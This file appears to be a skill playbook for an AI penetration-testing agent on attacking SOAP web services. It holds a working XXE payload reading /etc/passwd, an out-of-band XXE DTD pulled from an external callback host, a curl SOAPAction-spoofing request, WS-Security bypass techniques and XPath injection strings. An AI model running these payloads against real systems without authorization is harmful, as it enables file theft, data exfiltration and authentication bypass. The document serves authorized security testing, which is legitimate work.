---
name: soap-api-security
description: SOAP web service security testing — WSDL analysis, XXE and XML injection, SOAPAction spoofing, WS-Security bypass, XPath injection, and entity-expansion abuse with fault-and-data differential evidence
intent: offensive
protocol: soap
---

# SOAP Web Service Security Testing

## Purpose
Exploit SOAP services: XML attacks through the envelope (XXE, XPath/XSLT injection, entity expansion), operation routing confusion (SOAPAction spoofing), and WS-Security implementation failures.

## Preconditions
- Service endpoint URL and WSDL access (append `?wsdl` to typical service paths)
- SOAP client tooling: curl with crafted envelopes, Python requests, SoapUI (optional)
- Understanding of the SOAP version (1.1 vs 1.2) in use (affects headers)

## Attack Surface Signals
- WSDL disclosures with full operation/parameter schemas
- `Content-Type: text/xml` / `application/soap+xml` endpoints
- SOAPAction headers, WS-Security UsernameTokens, SAML assertions in headers
- Legacy enterprise, financial, healthcare, and integration services

## Methodology

### Step 1: WSDL Reconnaissance
```bash
curl -sk "https://TARGET/service?wsdl" > tmp/service.wsdl
# Extract operations, parameters, and namespaces
grep -o 'name="[^"]*"' tmp/service.wsdl | sort -u
python3 - <<'PY'
import re
wsdl = open('tmp/service.wsdl').read()
for op in re.findall(r'<wsdl:operation name="([^"]+)"', wsdl):
    print(op)
PY
```
The WSDL enumerates every operation including undocumented internal ones. Do not re-enumerate the surface here — consume reconnaissance output.

### Step 2: XXE
```xml
<!-- Classic file read -->
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><op><param>&xxe;</param></op></soap:Body>
</soap:Envelope>
<!-- Blind OOB when output is suppressed -->
<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "https://OOB.oast.pro/x.dtd"> %dtd;]>
```
Confirmed by file contents in the response or an OOB callback with the exfiltrated data — never by parse errors alone. Test every operation and every XML parameter, plus headers that reach the parser.

### Step 3: SOAPAction Spoofing
```bash
# Send operation A's body with operation B's SOAPAction (or none in SOAP 1.2,
# where the action moves to the Content-Type). Mismatched routing can bypass
# per-action authorization on some stacks.
curl -sk -X POST "https://TARGET/service" \
  -H "Content-Type: text/xml" -H 'SOAPAction: "urn:AdminDeleteUser"' \
  -d '<soap:Envelope>...(normal-user operation body)...</soap:Envelope>'
```
A finding requires the routed-to operation actually executing for an unauthorized caller — a Fault is a miss.

### Step 4: WS-Security Bypass
```text
- strip the entire Security header: does the operation still execute?
- empty UsernameToken (empty username/password)
- replay expired or forged Timestamp elements (Created/Expires never validated)
- digest password with known nonce: reuse or forge the Nonce+Created combination
- signature wrapping: move the signed body and inject unsigned modifications
```
A real bypass returns a successful SOAP body (no Fault) WITHOUT valid credentials — a rejection Fault means the control held.

### Step 5: Injection in XML Context
- XPath injection into element text values: `' or '1'='1`, node extraction
- SQL injection via XML text nodes reaching stored procedures
- XSLT injection where the service transforms attacker-supplied XML: `<xsl:import>` to external documents, system-property() probes
- Confirm with boolean/data differentials, same contract as api-injection

### Step 6: Entity-Expansion Abuse (XML bombs)
```text
Billion-laughs / quadratic blowup: nested internal entities multiplying to
exponential expansion. Confirm the service processes the document (delay or
resource exhaustion differential vs a benign document of equal transport
size). Many stacks cap expansion — a rejected document is a miss.
```

## Evidence Contract
- **XXE**: file contents in the response, or OOB callback carrying target data
- **SOAPAction bypass**: the target operation executes for an unauthorized caller (state change verifiable)
- **WS-Security bypass**: operation succeeds (no Fault) without valid credentials
- **Injection**: data extraction or boolean/timing differential vs benign baseline
- **Entity abuse**: measured processing differential on equal-size documents

**NOT evidence**: SOAP Faults (validation working), WSDL disclosure alone, parse errors, the service accepting well-formed XML

## Common Misses
- Only the first operation tested; XXE lives in specific parameters
- SOAP 1.2 services: action moved to Content-Type parameter, SOAPAction header ignored
- MTOM/XOP attachments and multipart/related bodies never fuzzed
- WS-Addressing headers (ReplyTo/To) exploitable for SSRF-style redirects of responses
- Blind XXE not followed up with OOB when output is suppressed
- Namespace-qualified vs unqualified element injection variants

## False Positives / Non-Findings
- Fault responses with "invalid security token" (control working)
- WSDL exposure with no further exploitable condition (surface intelligence only)
- Entity expansion rejected by parser limits (protection working)
- Error strings echoing input without parser-level effect

## Xalgorix Tool Strategy
- `http_request`/curl for precise envelope and header control
- Python for generated XML payloads and entity expansion chains
- `oob_callback` for blind XXE confirmation
- XSLT import chains as OOB transport for exfiltration

## Stopping Rule
Every operation from the WSDL x every XML parameter and security header x XXE/SOAPAction/WS-Security/injection vectors.

## Handoff
Report operation, envelope payload, confirmation method (file contents, OOB interaction, executed state change), and SOAP version. WS-Addressing-based server-side fetches chain into api-ssrf.